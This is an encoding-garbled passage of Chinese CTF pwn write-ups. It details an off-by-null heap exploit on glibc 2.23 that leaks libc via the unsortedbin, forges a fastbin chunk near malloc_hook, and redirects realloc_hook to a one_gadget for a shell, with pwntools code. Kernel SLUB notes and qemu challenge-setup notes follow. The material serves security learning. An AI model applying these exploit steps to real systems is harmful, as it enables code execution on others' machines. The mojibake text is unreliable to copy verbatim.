Œfdå’Œbkå°±æ˜¯chunk1çš„dataéƒ¨åˆ†ã€‚æ‰€ä»¥showå‡½æ•°å°±å¯ä»¥æ‰“å°å‡ºchunk1çš„dataéƒ¨åˆ†ï¼Œä»è€Œæ‰“å°å‡ºfdå’ŒbkæŒ‡å‘çš„unsortedbinså¤´éƒ¨é“¾è¡¨åœ°å€ã€‚åˆç”±äºunsortedbinså¤„åœ¨main_arena+0x58ä½ç½®ï¼Œè€Œmain_arenaç›¸å¯¹äºlibcåŸºåœ°å€çš„åç§»æ˜¯å›ºå®šçš„ï¼Œä¸º0x3c4b20(ä¸åŒglibcç‰ˆæœ¬å¯èƒ½ä¸åŒï¼Œè¿™æ˜¯libc2.23çš„)ï¼Œæ‰€ä»¥è¿™ä¹Ÿå°±é—´æ¥æ³„éœ²å‡ºäº†libcåŸºåœ°å€ã€‚\n\nâ–²æŸ¥è¯¢main_arenaæ–¹æ³•ï¼š\n\nâ‘ å·¥å…·æŸ¥è¯¢ï¼šhttps://github.com/coldwave96/libcoffsetï¼š\n\nâ‘¡IDAæŸ¥è¯¢ï¼šmain_arenaå­˜å‚¨åœ¨libc.so.6æ–‡ä»¶çš„.dataæ®µï¼Œä½¿ç”¨IDAæ‰“å¼€libcæ–‡ä»¶ï¼Œç„¶åæœç´¢å‡½æ•°malloc_trim()\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537434.jpeg)\n\n \n\n3.ç°åœ¨æœ‰äº†libcåŸºåœ°å€ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±è€ƒè™‘ä¿®æ”¹mallo_hookå’Œrealloc_hookçš„å€¼ã€‚åŒæ ·ä½¿ç”¨0å­—èŠ‚æº¢å‡ºæ¼æ´ï¼Œä¼ªé€ fakechunkä¸ºmallo_hookåœ°å€ï¼Œä¿®æ”¹fakechunkä»è€Œä¿®æ”¹malloc_hookå’Œrealloc_hookã€‚è¿™é‡Œå…ˆå¿½ç•¥ä¸Šé¢çš„ï¼Œç¨‹åºä¸­çš„ç´¢å¼•ä¼šä¸å¤ªä¸€æ ·ã€‚æ”»å‡»æ€è·¯å¦‚ä¸‹ï¼š\n\n(1)å…ˆç”³è¯·ä¸€ä¸ªè¾ƒå¤§çš„chunkï¼Œé˜²æ­¢å’Œä¸Šé¢çš„åˆå¹¶\n\n(2)ä¹‹åçš„æ“ä½œæ–¹æ³•ç±»ä¼¼ï¼Œå…ˆç”³è¯·å››ä¸ªchunkï¼Œåˆ†åˆ«ä¸ºchunk0,chunk1,chunk2,chunk3ã€‚(chunk3é˜²æ­¢åˆå¹¶ç”¨)\n\n(3)freeæ‰chunk0ï¼Œä½¿å…¶è¿›å…¥unsortedbinsä¸­ã€‚ä¿®æ”¹chunk1çš„æœ€åå…«ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯chunk2çš„pre_sizeä½ï¼Œä½¿å¾—chunk2çš„pre_sizeä½çš„å¤§å°ä¸ºchunk0_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk2ï¼Œä½¿å¾—chunk0,chunk1,chunk2ä¸‰ä¸ªchunkä½œä¸ºä¸€ä¸ªæ•´ä½“è¢«åˆå¹¶ä¹‹åæ”¾å…¥åˆ°unsortedbinsä¸­ã€‚å†freeæ‰chunk1ï¼Œä½¿å…¶è¿›å…¥fastbinsä¸­ã€‚è¿™æ ·chunk1å³åœ¨fastbinsä¸­ï¼Œä¹Ÿå¤„åœ¨unsortedbinsä¸­ã€‚\n\n(5)ç”³è¯·ä¸€ä¸ªç‰¹æ®Šå¤§å°çš„chunkå—ï¼Œæœ€å°ä¸ºchunk0_size+0x20ï¼Œä½¿å…¶çš„dataéƒ¨åˆ†è¶³å¤Ÿå¤§ï¼Œèƒ½å¤Ÿä¿®æ”¹æ‰chunk1çš„fdä½ï¼Œå°†chunk1çš„fdä½æŒ‡å‘fakechunkï¼Œç”±äºéœ€è¦ä»sizeä½è¦†ç›–åˆ°fdï¼Œæ‰€ä»¥éœ€è¦ä¼ªé€ åˆæ³•çš„sizeï¼Œä¸ºchunk1_sizeã€‚\n\n(6)ç”³è¯·ä¸¤ä¸ªchunk1å¤§å°çš„chunk_aï¼Œchunk_bï¼Œè¿™æ ·ç¬¬ä¸€æ¬¡ç”³è¯·çš„chunk_aå°±æ˜¯ä»fastbinsä¸­å›æ¥çš„chunk1ã€‚è€Œchunk_bå°±æ˜¯chunk1çš„fdæŒ‡å‘çš„fakechunkã€‚è¿™æ ·å¦‚æœå°†fakechunkæ”¾åœ¨realloc_hookä¹‹å‰ï¼Œé‚£ä¹ˆå°±å¯ä»¥ä¿®æ”¹æ‰realloc_hookå’Œmalloc_hookï¼Œä½¿å¾—realloc_hookæŒ‡å‘one_gadgetï¼Œè€Œmalloc_hookæŒ‡å‘__libc_libcå‡½æ•°ä¸­çš„æŸä¸ªå¯ä»¥æ§åˆ¶æ ˆå¸§çš„åœ°å€ï¼Œä»è€Œæ»¡è¶³gadgetæ¡ä»¶æ¥getshellã€‚\n\n4.å¼€å§‹ç¼–å†™expï¼Œå¢åˆ æ”¹æŸ¥å‡½æ•°å°±ä¸è¯´äº†:\n\n(1)è·å–libcåŸºåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0xf0,'0'*0xf0)\nadd(0x68,'1'*0x68)#trigger 0ff-by-null\nadd(0xf0,'2'*0xf0)\nadd(0x10,'3'*0x10)\n#chunk0,chunk1,chunk2,chunk3(é˜²æ­¢åˆå¹¶)\n\ndelete(0)#é˜²æ­¢ç¨‹åºå´©æºƒ\nedit(1,0x68,flat('1'*0x60,0x170))\n#ä¿®æ”¹chunk2çš„pre_sizeï¼Œä½¿å¾—chunk0,chunk1,chunk3æ‰‹ç‰µæ‰‹è¿›å…¥unsortedbinsä¸­\ndelete(2)\n#è§¦å‘chunk2çš„pre_sizeä½œç”¨\n\n#å…³é”®å°±åœ¨è¿™ä¸ªaddï¼Œç›®çš„å°±æ˜¯å°†unsortedbinsçš„é“¾è¡¨å¤´éƒ¨æ”¾åˆ°chunk1çš„fdå’Œbkä½\nadd(0xf0,'x'*0x10)\n\n#ç°åœ¨å°±å¯ä»¥æ‰“å°chunk1æ¥è·å–unsortedbinsé“¾è¡¨çš„å¤´éƒ¨åœ°å€ï¼Œä»è€Œè®¡ç®—å¾—åˆ°libcåœ°å€\nshow()\nlibc_address = u64(io.recvuntil(\"\\x7f\")[-6: ]+'\\0\\0')-0x3c4b78\nprint(\"libc @ {:#x}\".format(libc_address))\n```\n\n(2)ä¼ªé€ fakechunkï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x160,'4'*0x160)\n#ç¬¬ä¸€ä¸ªchunké˜²æ­¢åˆå¹¶åŠ ç¨‹åºå´©æºƒ\n\nadd(0xf0,'a'*0xf0)\nadd(0x68,'b'*0x68)\nadd(0xf0,'c'*0xf0)\nadd(0x10,'d'*0x10)\n#å››ä¸ªchunkï¼Œå¥—è·¯ä¸€æ ·ã€‚ç”±äºç¨‹åºç¼–å†™åŸå› ï¼Œæ‰€ä»¥ç´¢å¼•å˜æˆchunk4,chunk5,chunk6,chunk7,å¯¹åº”ä¸Šé¢çš„chunk0,chunk1,chunk2,chunk3ã€‚\n\n\ndelete(4)#é˜²æ­¢ç¨‹åºå´©æºƒ\nedit(5,0x68,flat('b'*0x60,0x170))\n#ä¿®æ”¹chunk2çš„pre_sizeï¼Œä½¿å¾—chunk0,chunk1,chunk3æ‰‹ç‰µæ‰‹è¿›å…¥unsortedbinsä¸­\ndelete(6)\n#è§¦å‘chunk6çš„pre_sizeä½œç”¨\n\ndelete(5)\nadd(0x120,flat('A'*0xf8,0x70,(libc_address+0x3c4aed)))\n#ä½¿å¾—chunk5è¿›å…¥fastbinsï¼Œä¹‹åä¿®æ”¹å…¶fdä½ï¼Œåˆ›é€ ä¸€ä¸ªfakechunkè¿›å…¥fastbinsã€‚è¿™é‡Œçš„fakechunk_addrå°±æ˜¯libc_address+0x3c4aedã€‚è¿™é‡Œçš„0x70å†™æˆ0x71ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºä¹‹åæ˜¯mallocï¼Œä¸ä¼šç®¡chunkçš„IN_USEä½ï¼Œä¹Ÿå°±æ˜¯Pä½ã€‚\n```\n\n(3)ç”³è¯·è·å¾—fakechunkï¼ŒåŒæ—¶ä¿®æ”¹è¯¥fakechunkï¼ŒåŠ«æŒmalloc_hookå’Œrealloc_hookã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nadd(0x68,'x'*0x10)\nadd(0x68,flat('\\0'*11,(libc_address+one_gadget),(libc_address+16+libc.sym[\"__libc_realloc\"])))\n```\n\n(4)éšä¾¿ç”³è¯·ä¸€ä¸ªchunkå³å¯getshellï¼Œä½†æ˜¯è¿™é‡Œä¸è¦ä½¿ç”¨ä¹‹å‰æˆ‘ä»¬å®šä¹‰çš„addå‡½æ•°ï¼Œå› ä¸ºç¨‹åºä¸€æ—¦call mallocå³å¯getshellï¼Œå³è¿è¡Œåˆ°è¾“å…¥é•¿åº¦å³å¯ï¼Œä½†æ˜¯æˆ‘ä»¬çš„addå‡½æ•°ä¸­ä¸€ç›´è¿è¡Œåˆ°è¾“å…¥å†…å®¹æ‰ç»“æŸï¼Œä¼šå¯¼è‡´ç¨‹åºå¡ä½ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nio.sendlineafter(\"choice:\",\"2\")\nio.sendlineafter(\":\",\"anything\")\n\nio.interactive()\n```\n\n5.è¿™é‡Œéœ€è¦å¾ˆå¤šè°ƒè¯•çš„æ­¥éª¤ï¼š\n\n(1)ä»æœ€å¼€å§‹æ‰“ç®—ä¼ªé€ fakechunkæ—¶å°±åº”è¯¥çŸ¥é“æˆ‘ä»¬çš„chunkå¤§å°åº”è¯¥è®¾ç½®ä¸º0x68ï¼Œå› ä¸ºç¨‹åºè·‘èµ·æ¥æ˜¯0x7få¼€å¤´ï¼Œæ‹¿æ¥ä¼ªé€ sizeå†åˆé€‚ä¸è¿‡ï¼Œè¿™æ ·çš„chunkå¤§å°æ˜¯0x70ã€‚è€Œæˆ‘ä»¬åˆåªèƒ½ç”¨0å­—èŠ‚æº¢å‡ºï¼Œæ‰€ä»¥éœ€è¦å°†chunkè®¾ç½®åˆ°æœ€å¤§ï¼Œä¹Ÿå°±æ˜¯0x70-0x08ã€‚\n\n(2)è€Œ0xf0å¯ä»¥æ”¹å˜ï¼Œåªè¦æ¯”fastbins_MAXå¤§å°±è¡Œï¼Œé‚£ä¹ˆå¯¹åº”çš„0x170ä¹Ÿéœ€è¦æ”¹å˜ï¼ŒåŒæ—¶ä¹Ÿè¦æ”¹å˜0x120ã€‚\n\n(3)ç”³è¯·fakechunkæ­¥éª¤ä¸­çš„'\\0'*11ä¹Ÿæ˜¯éœ€è¦é€šè¿‡è°ƒè¯•ç®—å‡ºæ¥ï¼Œæ–¹æ³•å°±æ˜¯gdbæŸ¥çœ‹realloc_hook-0xxxé™„è¿‘çš„å†…å­˜ï¼Œé€‰æ‹©åˆé€‚çš„å¯ä»¥ä¼ªé€ sizeçš„åœ°å€ï¼Œä¹‹åé€šè¿‡å¡«å……paddingæ¥è¦†ç›–realloc_hookå’Œmalloc_hookã€‚\n\n(4)onegadgetç›¸å…³çš„+16ä¹Ÿå¾—é€šè¿‡è°ƒè¯•æ‰èƒ½çŸ¥é“ï¼Œè¿™é‡Œé€‰å–çš„onegadgetæ¡ä»¶æ˜¯[rsp+0x30]==Nullã€‚æ‰€ä»¥è°ƒè¯•æ—¶å°†æ–­ç‚¹ä¸‹åœ¨__libc_reallocå‡½æ•°ä¸Šï¼Œè¿›å…¥__libc_reallocå‡½æ•°ï¼Œä»è€Œä¸€ç›´è¿›å…¥åˆ°onegadgetçš„æ‰§è¡Œä»£ç ä¸­ï¼Œå¦‚ä¸‹ï¼š\n\nå…ˆä¸‹æ–­ç‚¹è®©ç¨‹åºè¿è¡Œåˆ°è¿™![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536075.jpeg)\n\nå†è¾“å…¥niè¿›å…¥:![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191537426.jpeg)\n\nè¿™æ—¶å€™å°±å¯ä»¥çœ‹rspçš„å€¼äº†ï¼š![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536542.jpeg)\n\nè¿™é‡Œçš„rspæ˜¯0x7ffca3331eb8ï¼Œrsp+0x30=0x7ffca3331ee8ï¼Œå¯¹åº”å›¾ä¸­çš„å€¼å°±å¾—æ˜¯0æ‰æ»¡è¶³æ¡ä»¶(è¿™é‡Œå·²ç»è®¡ç®—è¿‡äº†ï¼Œ+16)\n\nâ–²å¦‚æœä»æœ€å¼€å§‹è¿›å…¥__libc_reallocå‡½æ•°ï¼Œè¿›å…¥åˆ°onegadgetä¸­ä¹‹åï¼Œå‘ç°æ¡ä»¶ä¸æ»¡è¶³ï¼Œé‚£ä¹ˆéœ€è¦è§‚å¯Ÿå‰åçš„å€¼ï¼Œä»è€Œå†³å®šä»å“ªé‡Œè¿›å…¥__libc_reallocå‡½æ•°æ‰èƒ½ä½¿å¾—rspæ»¡è¶³ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536192.jpeg)\n\nå› ä¸º__libc_realloc(å°±æ˜¯realloc)å‡½æ•°æœ‰ä¸€å †çš„pushå’Œsubæ“ä½œï¼Œå°‘ä¸€ä¸ªpushï¼Œé‚£ä¹ˆrspå°±å¯ä»¥ä¸‹æŒª0x08ï¼Œç›¸å½“äºrsp+0x08ï¼Œä¸­é—´è¿˜æœ‰sub rsp,xxhï¼Œç›¸å½“äºä¸ŠæŒªrspã€‚æ‰€ä»¥å†³å®šä»å“ªé‡Œè¿›å…¥reallocå‡½æ•°å†³å®šäº†onegadgetçš„æˆåŠŸä¸å¦ã€‚![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536822.jpeg)\n\nè€Œé€šè¿‡æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œå®é™…çš„onegagetæ˜¯é€šè¿‡0x84724 mov rax,cs:__realloc_hook_pträ¼ è¿›æ¥ï¼Œä¹‹åç”±äº\n\n```\n#æ³¨é‡Šå¤´\n\ntest rax rax\njnz  loc_84958\n```\n\nraxä¸ä¸º0ï¼Œå¿…å®šè·³è½¬loc_84958:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191538482.jpeg)\n\nè¿™é‡Œæ‰æ˜¯æˆ‘ä»¬é€‰æ‹©è°ƒç”¨è¿›å…¥onegadgetçš„å…¥å£ã€‚æ‰€ä»¥ä¹‹å‰åœ¨__libc_reallocçš„è®¡ç®—éƒ½æ˜¯ä¸ºäº†è°ƒæ•´æ ˆå¸§ï¼Œä¸ç„¶å…¶å®å¦‚æœæ ˆå¸§ä¸ç”¨è°ƒæ•´å°±å¯ä»¥æ»¡è¶³ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†malloc_hookæ”¹æˆonegadgetä¹Ÿå¯ä»¥ç›´æ¥getshellã€‚å› ä¸º__libc_mallocå‡½æ•°ä¸­çš„æ±‡ç¼–ä»£ç ä¹Ÿæ˜¯ç±»ä¼¼çš„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536213.jpeg)\n\nè€Œä¸”è¿™è¿˜æ˜¯ä¸€ä¸ªæ— æ¡ä»¶è·³è½¬ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191536275.jpeg)\n\nå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªpush,ä¸€ä¸ªsub rsp,8;ä¸¤ä¸ªPopã€‚ç›¸å½“äºåªè¦åœ¨call mallocä¹‹å‰ï¼Œæˆ‘ä»¬çš„rsp+0x28==NULLå³å¯æ»¡è¶³onegadgetçš„rsp+0x30==NULLçš„æ¡ä»¶ã€‚å½“ç„¶ï¼Œä»¥ä¸Šåªæ˜¯åœ¨Libc2.23ä¸‹çš„ï¼Œå¦‚æœæ˜¯å…¶å®ƒç‰ˆæœ¬çš„libcå°±å¯èƒ½ä¸å¤ªä¸€æ ·ã€‚\n\n \n\n \n","tags":["off-by-null"],"categories":["PWN","pwnå †-off-by-null"]},{"title":"pwn-kernel_Heapæ€»ç»“","url":"/2021/08/14/pwn-kernel_Heapæ€»ç»“/","content":"\nä¸€ã€SLUBå’ŒSLABï¼šå†…æ ¸çš„å †æ¯”ç”¨æˆ·çš„å †ä¼šç®€å•å¾ˆå¤šï¼Œéœ€è¦äº†è§£ä¸€äº›æœºåˆ¶ã€‚\n\n1.åˆ†é…çš„å¤§å°ï¼šä¹Ÿæ˜¯ç±»ä¼¼å¯¹é½çš„ï¼Œä½†ä¹Ÿæœ‰ç‚¹ä¸åŒ\n\nlinuxä¸‹æŸ¥çœ‹å‘½ä»¤ï¼šcat /proc/slabinfo\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_12-46-27.png)\n\nå¯ä»¥çœ‹åˆ°kmallocåˆ†ä¸ºå¾ˆå¤šçš„å¤§å°ï¼Œä»å¤§åˆ°å°åˆ†åˆ«ä¸º8k->8å­—èŠ‚ï¼Œæ¯ä¸ªéƒ½ç›¸å½“äºæ˜¯ä¸€ä¸ªæ¡¶ï¼Œé‡Œé¢å­˜å‚¨æ‰€æœ‰çš„ç©ºé—²å—æˆ–è€…éç©ºé—²å—ã€‚æ‰€ä»¥å½“æˆ‘ä»¬åˆ†é…17å­—èŠ‚æ—¶ï¼Œå¾—åˆ°çš„ç©ºé—´å…¶å®æ˜¯32å­—èŠ‚ï¼Œ5Kå­—èŠ‚å¾—åˆ°çš„æ˜¯8Kå­—èŠ‚çš„ç©ºé—´ã€‚è¿™ä¸ªåœ¨ç”¨å †æº¢å‡ºçš„æ—¶å€™éœ€è¦ç”¨åˆ°ã€‚\n\n \n\n2.ç®¡ç†æœºåˆ¶ï¼šå•é“¾è¡¨ç»“æ„\n\n(1)ç”³è¯·åŸåˆ™ï¼š\n\nä»¥ä¸€å®šå¤§å°çš„ç©ºé—²chunkä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ï¼Œä»¥fdä¸²è”ï¼Œå¹¶ä¸”chunkçš„ç»“æ„åªæœ‰ä¸€ä¸ªfdï¼Œä¸åƒç”¨æˆ·æ€ä¸­æœ‰æœ‰å¤´ç»“æ„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-14-21.png)\n\nå¦‚æœç”³è¯·æœŸé—´æ”¹å˜äº†ç©ºé—²é“¾è¡¨ç¬¬ä¸€ä¸ªchunkçš„fdï¼Œé‚£ä¹ˆå†ç”³è¯·ä¸€æ¬¡å¾—åˆ°è¯¥chunkï¼Œç„¶åå†ç”³è¯·å°±å¾—åˆ°ä¿®æ”¹åçš„fdã€‚å¦‚ä¸Šå›¾ï¼Œå¦‚æœ0xffff8880029f8000æ˜¯å¯¹åº”slubæ¡¶å¤§å°çš„chunkç©ºé—²é“¾è¡¨ç¬¬ä¸€ä¸ªï¼Œé‚£ä¹ˆç”³è¯·è¯¥å¤§å°chunkåå¾—åˆ°çš„æ˜¯0xffff8880029f8000ï¼Œå†ç”³è¯·ä¸€æ¬¡å°±ä¼šå¾—åˆ°0x6bc360ã€‚\n\nâ–²è¿™ä¸ªå…·ä½“çš„ç®¡ç†ç»“æ„ä¸çŸ¥é“åœ¨å“ªï¼Œä½†æ˜¯å¦‚æœå†ç”³è¯·è¯¥å¤§å°çš„chunkï¼š\n\nâ‘ 0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸ºä¸€ä¸ªæœ‰æ•ˆçš„å¯ç”¨åœ°å€ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x6bc460ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°è¿ç»­å¾—åˆ°0x6bc360å’Œ0x6bc460ã€‚\n\nâ‘¡0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸º0ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x0ï¼Œé‚£ä¹ˆå…ˆå¾—åˆ°0x6bc360ï¼Œç„¶åä¼šä»å¦ä¸€ä¸ªæ¡¶ä¸­ç”³è¯·chunkï¼Œè¯¥å¤§å°çš„ç©ºé—²é“¾è¡¨æ¡¶å°±ä¼šåºŸå¼ƒä¸å†ä½¿ç”¨ï¼Œç›¸å½“äºç³»ç»Ÿé»˜è®¤è¯¥æ¡¶ç”¨å®Œã€‚ä¹‹åå†ç”³è¯·è¯¥å¤§å°çš„chunkä¼šä»æ–°æ¡¶ä¸­ç»§ç»­ç”³è¯·ã€‚\n\nâ‘¢0x6bc360åœ¨è¢«ç”³è¯·å‡ºæ¥ä¹‹å‰ï¼Œå…¶fdä¸ºæ— æ•ˆåœ°å€ï¼Œæ¯”å¦‚\n\n0x6bc360 --> 0x40ï¼Œé‚£ä¹ˆå…ˆå¾—åˆ°0x6bc360ï¼Œç„¶åå†ç”³è¯·ï¼Œç³»ç»Ÿå°±ä¼šå´©æºƒã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-25-50.png)\n\n \n\n(2)é‡Šæ”¾åŸåˆ™ï¼š\n\nåŒæ ·æ˜¯ä»¥ä¸€å®šå¤§å°çš„ç©ºé—²chunkä½œä¸ºä¸€ä¸ªå•é“¾è¡¨ï¼Œä»¥fdä¸²è”ï¼Œä¹Ÿç±»ä¼¼fastbinç»“æ„ï¼Œå…ˆè¿›åå‡ºï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-38-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_15-39-01.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œé‡Šæ”¾å®Œä¸‰ä¸ªchunkä¹‹åï¼Œå†ç”³è¯·ï¼Œä¼šå…ˆå¾—åˆ°chunk0ï¼Œå†å¾—åˆ°chunk2ï¼Œchunk1ã€‚æ‰€ä»¥è¿™é‡Œä¹ŸåŒæ ·å¯ä»¥çœ‹å‡ºï¼Œåœ¨é‡Šæ”¾ä¹‹åï¼Œè¯¥chunkçš„fdä¼šè¢«æ”¹å†™ï¼ŒæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²chunkã€‚åªä¸è¿‡ä¸ç”¨çœ‹sizeå’Œå…¶ä»–ä¸ƒä¸ƒå…«å…«çš„æ£€æŸ¥ï¼Œåªç”¨fdå³å¯æ‰“ç±»ä¼¼fastbinçš„æ”»å‡»äº†ï¼Œæ–¹ä¾¿äº†å¾ˆå¤šã€‚\n","tags":["kernelHeap-Knowledge"],"categories":["pwn-kernel"]},{"title":"pwn-kernel_åšé¢˜çŸ¥è¯†","url":"/2021/08/14/pwn-kernel_åšé¢˜çŸ¥è¯†/","content":"\n\n\nä¸€ã€é¢˜ç›®ç»™çš„æ–‡ä»¶ï¼š\n\n1.bzImageï¼šå°±æ˜¯linuxç¼–è¯‘åçš„è¿è¡Œå†…æ ¸ï¼Œåœ¨å¯åŠ¨å‚æ•°ä¸­è®¾ç½®å³å¯ã€‚\n\n2.file.cpioï¼šé¢˜ç›®ç»™çš„ï¼Œæœ‰çš„å¯ä»¥ç›´æ¥ç”¨qemuå¯åŠ¨è¿è¡Œï¼Œä½†æ˜¯æœ‰çš„éœ€è¦è§£å‹åå†æ‰“åŒ…ï¼Œå…·ä½“çœ‹é¢˜ç›®ã€‚\n\n3.xx.shæ–‡ä»¶:å¯åŠ¨æ–‡ä»¶ï¼Œé‡Œé¢åŒ…å«ä»£è¡¨qemuå¯åŠ¨æ—¶çš„å„ç§å‚æ•°ï¼š\n\n(1)qemu-system-x86_64ï¼šæ¶æ„\n\n(2)-mï¼šè®¾ç½®è¿è¡Œå†…å­˜ã€‚\n\n-m 64M\n\n-m 128M....\n\n(3)-kernelï¼šè®¾ç½®è¿è¡Œçš„å†…æ ¸ï¼Œä¸€èˆ¬é¢˜ç›®ä¼šç»™ï¼Œè‡ªå·±ä¹Ÿå¯ä»¥å» [www.kernel.org](http://www.kernel.org) æ¥ä¸‹è½½ç¼–è¯‘å†…æ ¸ã€‚\n\n-kernel bzImage\n\n(4)-initrdï¼šè®¾ç½®åˆå§‹åŒ–çš„æ ¹æ–‡ä»¶ç³»ç»Ÿï¼Œå°±æ˜¯.cpioæ–‡ä»¶ï¼Œé¢˜ç›®ç»™çš„å¯èƒ½æœ‰é™·é˜±ä»€ä¹ˆçš„ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦è§£å‹ç„¶åçœ‹çœ‹å…¶ä¸­çš„initæ˜¯ä¸æ˜¯æœ‰äº›å¹²æ‰°ä¸œè¥¿ã€‚\n\nä¾‹å¦‚poweroff -d 120 -f & è¿™è¡Œä»£ç å°±ä»£è¡¨å®šæ—¶å…³æœºï¼Œè¿™å°±éœ€è¦å»æ‰ï¼Œå»æ‰å¯èƒ½çš„å¹²æ‰°åå°±å†æ‰“åŒ…ï¼Œé‡æ–°ç”Ÿæˆ.cpioæ–‡ä»¶ï¼Œç„¶åé€šè¿‡./xx.shå¯åŠ¨\n\nâ‘ è§£å‹ï¼š\n\nmkdir file\n\ncd file\n\ncpio -idm < ./core.cpio  //å†æ¬¡è§£å‹\n\n```\n#æ³¨é‡Šå¤´\n\nmv ../file.cpio file.cpio.gz  //æ”¹åï¼Œæ–¹ä¾¿gunzipè¯†åˆ«æ ¼å¼\ngunzip ./file.cpio.gz     //è§£å‹\n#å¦‚æœæ˜¯æ­£å¸¸cpioæ‰“åŒ…åˆ™ä¸éœ€è¦ï¼Œä½†æ˜¯æœ‰çš„é¢˜ç›®å°±ä¼šæœ‰ç”¨Gunzipå‹ç¼©ä¹‹åå†cpioæ‰“åŒ…ã€‚\n```\n\nç„¶ååˆ é™¤file.cpioæ–‡ä»¶ï¼Œæ²¡å•¥ç”¨äº†ï¼Œé‚£ä¹ˆç°åœ¨çš„ç›®å½•ä¸‹çš„æ–‡ä»¶å¦‚æœå†æ‰“åŒ…ç”Ÿæˆcpioæ–‡ä»¶å°±ä¼šæ˜¯qemuåŠ è½½ä¹‹åçš„æ ¹ç›®å½•æ–‡ä»¶ç³»ç»Ÿäº†ã€‚\n\n-initrd ./core.cpio\n\nâ‘¡æ‰“åŒ…ï¼š\n\nåˆ‡æ¢åˆ°æ ¹ç›®å½•ä¸‹ï¼š\n\nfind ./* | cpio -H newc -o > file.cpio\n\nå½“å‰ç›®å½•ä¸‹å°±ç”Ÿæˆfile.cpioæ–‡ä»¶ï¼Œæ‹–åˆ°å’Œstart.shã€bzImageæ”¾åˆ°ä¸€ä¸ªç›®å½•ä¸‹ï¼Œè¿è¡Œstart.shå°±å¯ä»¥å¯åŠ¨qemuè™šæ‹Ÿæœºäº†ã€‚\n\n(5)-appendï¼šé™„åŠ çš„å­—ç¬¦ä¸²ï¼Œä¸ºgrubå¼•å¯¼å†…æ ¸æ—¶é™„åŠ çš„å‘½ä»¤è¡Œå‚æ•°ï¼ŒæŒ‡æ˜æ§åˆ¶å°ï¼Œç‰¹æƒï¼Œåˆå§‹è·¯å¾„ç­‰ï¼ŒæŒ‡å®šno kaslrå¯ä»¥å…³é—­éšæœºåç§»ã€‚\n\n-append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr\"\n\n(6)-sï¼šæ·»åŠ gdbè°ƒè¯•çš„ç›¸å…³æ¡ä»¶ï¼Œåªç”¨-så°±è¡Œï¼Œç­‰åŒäº-gdb tcp::1234\n\n(7)-cpu è®¾ç½®cpuå®‰å…¨é€‰é¡¹ã€‚kvm64æ˜¯åŠ é€Ÿå™¨\n\n-cpu kvm64,+smep  (kvm64ï¼Œå¼€å¯smepä¿æŠ¤)\n\n(8)--nographicï¼šè®¾ç½®ä¸ºæ— å›¾å½¢ç•Œé¢\n\nè¿˜æœ‰å…¶å®ƒçš„å„ç§é€‰é¡¹å‚æ•°ï¼Œé‡åˆ°é¢˜ç›®å†æŸ¥å§ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯smep,smap,kaslrç­‰ç›¸å…³çš„\n\n4.vmlinuxï¼šé™æ€ç¼–è¯‘ï¼Œæœªç»è¿‡å‹ç¼©çš„kernelæ–‡ä»¶ï¼ŒbzImageæ˜¯å‹ç¼©åçš„æ–‡ä»¶ã€‚\n\n \n\näºŒã€æ ¹æ–‡ä»¶ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š\n\n1.initï¼šå¯åŠ¨ç³»ç»Ÿçš„å‚æ•°è®¾ç½®ï¼Œå¾ˆå¤šï¼Œæ…¢æ…¢çœ‹ï¼Œå¤šäº†è§£ã€‚\n\n(1)insmodï¼šåŠ è½½é©±åŠ¨ï¼Œä¸€èˆ¬å°±æ˜¯file.koæ–‡ä»¶ï¼Œæ‰¾åˆ°å®ƒæ¥åˆ†æã€‚\n\n(2)poweroffï¼šå…³æœºï¼Œç›¸å…³å®šæ—¶ä¸€èˆ¬å»æ‰\n\n(3)setsidï¼šè®¾ç½®ç»ˆç«¯æƒé™ï¼Œidä¸º0å³ä¸ºrootï¼Œæœ¬åœ°ä¿®æ”¹ä¸º0å³ä¸ºrootæƒé™\n\nsetsid /bin/cttyhack setuidgid 1000 